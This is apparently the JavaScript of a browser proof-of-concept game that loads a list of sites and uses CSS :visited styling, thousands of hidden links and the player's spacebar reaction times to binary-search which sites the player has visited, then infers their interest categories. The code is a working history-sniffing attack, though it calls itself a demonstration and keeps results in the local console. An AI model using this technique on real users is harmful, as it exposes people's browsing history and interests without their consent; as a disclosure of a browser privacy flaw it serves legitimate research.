;(function(window) {
  var sharedState = {
    // lets us end the game after a minute
    gameStartTime: null,
    // lets us check for a long period of activity and pop
    // up a dummy element so that they don't get bored
    chunkStartTime: null,
    // lets us display their score in ms
    stepTime: null,
    // lets us be more friendly with scores if they hit during a render
    preRenderTime: null,
    // lets us cancel the next step if spacebar is clicked
    nextStep: null,
    // list of URLs being processed
    currentChunk: [],
    // boolean flag, true during the render step
    isRendering: false,
    // a stack for the step() function; simple recursive traversal of the
    // tree on the call stack isn't going to cut it since we need to wait
    // for user input to evaluate a branch's truthiness
    steps: [],
    // not really needed since we can just check nextStep, but it's clearer
    paused: true,
    inCountdown: false,
    // number of links tested per probe
    n: 16,
    DOM: {
      container: document.getElementById('container'),
      blocker: document.getElementById('blocker'),
      anchors: null,
      ms: document.getElementById('ms'),
      instructions: document.getElementById('instructions')
    },
    urls: [],
    probed: 0,
    visitedUrls: [],
    categories: {}
  };

  // Fisher-Yates shuffle, adapted from lodash
  function shuffle (array) {
    var index = -1, length = array.length, result = Array(length);

    array.forEach(function (value) {
      var rand = Math.floor(Math.random() * (++index + 1));
      result[index] = result[rand];
      result[rand] = value;
    });
    return result;
  }

  function repaint (el) {
    var display = el.style.display;
    el.style.display = 'none';
    el.offsetHeight;
    el.style.display = display;
  }

  function showAbout () {
    alert('This proof-of-concept combines a CSS n-to-2n decoder circuit, ' +
          'search trees, and the CSS :visited selector to steal history. ' +
          'It is 100% client-side; no data is recorded!\n\n:-)');
    alert('The game lasts for a minute; feel free to keep playing if you ' +
          ' wish to improve your results.\n\nAll code is on GitHub and ' +
          'feedback is very welcome.\n\nThis game will not work in your ' +
          'browser\'s "private browsing" or "incognito" mode.');
  }

  function initialize () {
    var container = sharedState.DOM.container;

    showAbout();

    // fill the container with 256n blank anchors
    var i = sharedState.n * 256;
    while (i--) container.appendChild(document.createElement('a'));

    // slice the blocker off
    sharedState.DOM.anchors = Array.prototype.slice.call(container.children, 1);
  }

  function showResults() {
    alert('Minute\'s up! Check the console...');
    console.log('You\'ve visited:');
    console.log(sharedState.visitedUrls);
    console.log('Which means that you might like:');
    console.log(sharedState.categories);
    console.log('We\'ve probed ' + sharedState.probed + ' sites so far... ' +
                'keep playing if you\'re curious :-)');

    // reset gameStartTime etc. in case they want to keep playing
    sharedState.gameStartTime = null;
    sharedState.paused = true;
    sharedState.inCountdown = false;
    sharedState.DOM.container.className = 'blocking';
    sharedState.DOM.instructions.textContent = 'to retry';
  }

  function getNextChunk () {
    var n = sharedState.n;
    sharedState.probed += n;
    // pop the sites from sharedState.urls
    return sharedState.urls.splice(-n);
  }

  // updates the anchor elements' hrefs to a passed URL chunk
  function populate (sites) {
    var href, n = sharedState.n;
    for (var i = 0; i < n; i++) {
      href = (sites[i] || {}).url;
      for (var j = i, _len = n * 256; j < _len; j += n) {
        if (href || sharedState.DOM.anchors[j].href !== '') {
          sharedState.DOM.anchors[j].href = href;
        }
      }
    }
  }

  // the main step function; cb is called after render, if provided.
  function step (cb) {
    var now = new Date().getTime();
    var nextChunk, currentLength = sharedState.currentChunk.length;

    // if the game's been going for over 1m and we're not searching
    // a tree, show their results
    if (
      now - sharedState.gameStartTime > 60000 &&
      currentLength === sharedState.n
    ) showResults();
    // if we've gone 18s without a hit, simulate one so they don't get bored
    else if (now - sharedState.chunkStartTime > 18000) {
      // handleKeydown will notice that nextStep is null and not run
      // splitToStack, avoiding a false positive
      sharedState.nextStep = null;
      sharedState.DOM.container.className = 'dummy';
      // update stepTime once the dummy color renders (should be super fast)
      window.setImmediate(function() { sharedState.stepTime = now; });
    } else {
      nextChunk = sharedState.steps.length ?
        sharedState.steps.pop() :
        getNextChunk();
      // wait until after render to update sharedState.currentChunk = nextChunk

      // if we passed on the first branch, the other branch must have a visited
      // link in it so we can skip that check & dive straight into it
      if (currentLength !== sharedState.n && currentLength === nextChunk.length) {
        splitToStack(nextChunk);
        step();
      } else {
        // populate is going to queue a big render...
        sharedState.isRendering = true;
        sharedState.preRenderTime = new Date().getTime();
        populate(nextChunk);
        // ...so we async this so that state only changes after the render...
        window.setImmediate(function () {
          // run the callback if it exists
          if (typeof cb === 'function') cb();
          // ...then push the rest to the back of the task queue
          // again to let keyEvents resolve first.
          window.setImmediate(function () {
            // the render is done. hurrah.
            sharedState.isRendering = false;
            sharedState.stepTime = new Date().getTime();


            // we're safe to change state now, since handleKeydown will
            // have already passed the old state to splitToStack
            sharedState.currentChunk = nextChunk;

            // if we're not paused, step again in [1000, 1200)ms + render time
            //
            // longer than linear version to (hopefully) avoid someone hitting
            // spacebar during render, which causes awkwardness (rendering the
            // next step, rerendering the current step, then displaying score)
            if (!sharedState.paused) {
              sharedState.nextStep = window.setTimeout(function () {
                step();
              }, Math.floor((Math.random() * 200) + 1000));
            }
          });
        });
      }
    }
  }

  function start () {
    function countdown (stage) {
      if (stage >= 0) {
        sharedState.DOM.ms.textContent = stage ? stage : 'GO';
        window.setTimeout(function () {
          countdown(stage - 1);
        }, 350);
      } else {
        if (!sharedState.gameStartTime) {
          sharedState.gameStartTime = new Date().getTime();
        }

        sharedState.DOM.ms.textContent = '';
        repaint(sharedState.DOM.blocker); // make sure...

        // let "go" render
        window.setImmediate(function () {
          sharedState.chunkStartTime = new Date().getTime();
          sharedState.DOM.container.className = '';
          sharedState.DOM.ms.textContent = '';
          // step and set inCountdown to false after the first render
          step(function () { sharedState.inCountdown = false; });
        });
      }
    }
    sharedState.inCountdown = true;
    // hide the evidence!
    sharedState.DOM.ms.textContent = '';
    sharedState.DOM.container.className = 'blocking';
    countdown(3);
  }

  function splitToStack (array) {
    var half = Math.floor(array.length / 2);
    // if length is one, move the URL to the visited list.
    //
    // if array === sharedState.currentChunk it will be mutated,
    // which is a good thing because it it will now have
    // a different length for the check in step()
    if (!half) {
      var visited = array.pop();
      var categories = sharedState.categories;
      sharedState.visitedUrls.push(visited.url);
      visited.categories.forEach(function (category) {
        if (!categories[category]++) categories[category] = 1;
      });
    }
    // else split it in two and push it to the stack
    else sharedState.steps.push(array.slice(0, half), array.slice(half));
  }

  function handleKeydown (e) {
    var key = e.key || e.keyCode, now;

    // if space is hit and we're not already counting down...
    if (!sharedState.inCountdown && key === 32) {
      // if we were paused, start it up
      if (sharedState.paused) {
        sharedState.paused = false;
        sharedState.DOM.instructions.textContent = 'when red';
        start();
      }
      // if we were playing, pause
      else {
        sharedState.paused = true;

        // move down the tree if we're not looking at a dummy positive
        if (sharedState.nextStep) {
          window.clearTimeout(sharedState.nextStep);
          sharedState.DOM.container.className = 'non-blocking';
          splitToStack(sharedState.currentChunk);
        }
        // jump back to the old hrefs if spacebar was hit during a render
        if (sharedState.isRendering) {
          now = sharedState.preRenderTime;
          populate(sharedState.currentChunk);
        } else now = new Date().getTime();

        // update the container text
        sharedState.DOM.ms.textContent = now - sharedState.stepTime + 'ms';
        sharedState.DOM.instructions.textContent = 'to retry';
      }
    }
    // prevent meta + a for select all
    else if (key === 65) {
      e.preventDefault();
      return false;
    }
  }

  var request = new XMLHttpRequest();

  request.open('GET', '../sites.json', true);

  request.onload = function () {
    if (request.status >= 200 && request.status < 400){
      var sites = JSON.parse(request.responseText);
      var userAgent = navigator.userAgent || navigator.vendor || window.opera;

      // convert recieved object to a shuffled array & store it in sharedState
      sharedState.urls =
        shuffle(Object.keys(sites).map(function (url) {
          return {
            url: url,
            categories: sites[url]
          };
        }));

      initialize();

      if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(userAgent)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(userAgent.substr(0,4))) {
        // we're on a mobile device
        document.getElementById('verb').textContent = 'Tap';
        document.getElementById('noun').textContent = 'screen';
        window.addEventListener('touchstart', function () {
          handleKeydown({key: 32}); // lol
        }, false);
      } else {
        window.addEventListener('keydown', handleKeydown, false);
      }
    }
  };

  request.send();
})(this);
